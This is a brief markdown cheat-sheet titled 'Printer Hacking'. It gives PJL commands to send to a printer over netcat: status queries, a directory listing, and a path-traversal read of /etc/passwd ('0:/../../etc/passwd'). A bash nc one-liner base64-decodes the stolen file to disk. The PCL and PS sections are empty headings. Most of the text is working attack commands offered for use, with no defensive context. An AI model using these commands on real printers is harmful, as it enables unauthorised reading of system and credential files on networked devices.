# Printer Hacking

The most common languages that printers can use to communicate are PJL, PCL, and PS. Simply open a netcat connection to the printer, and send the commands you want.

## PJL

First, get the status of the printer, and check if PJL is supported.
```PJL
@PJL INFO STATUS
@PJL INFO ID
```

Now list the directory contents. (Maybe not include the "count=65535" part if it doesn't work)
```PJL
@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=65535
```

Now download a file.
```PJL
@PJL FSUPLOAD NAME="0:/../../etc/passwd" OFFSET=0 SIZE=<filesize_here>
```

>Note: It feels like download and upload are switched, but it is from the perspective of the printer.

If the download just prints to terminal (first the command back, then the contents), and it is in base64, use this command in linux terminal.
```bash
echo '@PJL FSUPLOAD NAME="0:/../../etc/passwd" OFFSET=0 SIZE=<filesize_here>' | nc -q 2 <host> <port> | tail -n +2 | base64 -d > outfile
```

> Note: `tail -n +2` starts to read from second line onwards

## PCL

## PS